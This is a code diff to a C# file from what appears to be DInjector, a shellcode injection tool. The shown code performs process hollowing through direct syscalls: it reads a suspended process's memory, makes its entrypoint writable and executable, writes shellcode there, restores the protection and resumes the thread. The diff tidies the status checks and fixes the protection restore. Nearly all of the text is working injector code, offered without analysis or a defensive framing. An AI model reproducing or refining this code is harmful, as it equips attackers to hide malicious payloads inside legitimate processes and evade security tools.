@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -34,7 +35,7 @@ namespace DInjector
                 (uint)(IntPtr.Size * 6),
                 ref returnLength);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtQueryInformationProcess");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtQueryInformationProcess: {ntstatus}");
@@ -57,7 +58,7 @@ namespace DInjector
                 (uint)IntPtr.Size,
                 ref bytesRead);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");
@@ -80,7 +81,7 @@ namespace DInjector
                 0x200,
                 ref bytesRead);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");
@@ -113,7 +114,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");
@@ -135,7 +136,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtWriteVirtualMemory");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtWriteVirtualMemory: {ntstatus}");
@@ -144,14 +145,18 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (oldProtect)
 
+            protectAddress = entrypointAddress;
+            regionSize = (IntPtr)shellcode.Length;
+            uint tmpProtect = 0;
+
             ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 oldProtect,
-                ref oldProtect);
+                ref tmpProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, oldProtect");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
@@ -166,7 +171,7 @@ namespace DInjector
                 pi.hThread,
                 ref suspendCount);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(ProcessHollowing) [+] NtResumeThread");
             else
                 Console.WriteLine($"(ProcessHollowing) [-] NtResumeThread: {ntstatus}");
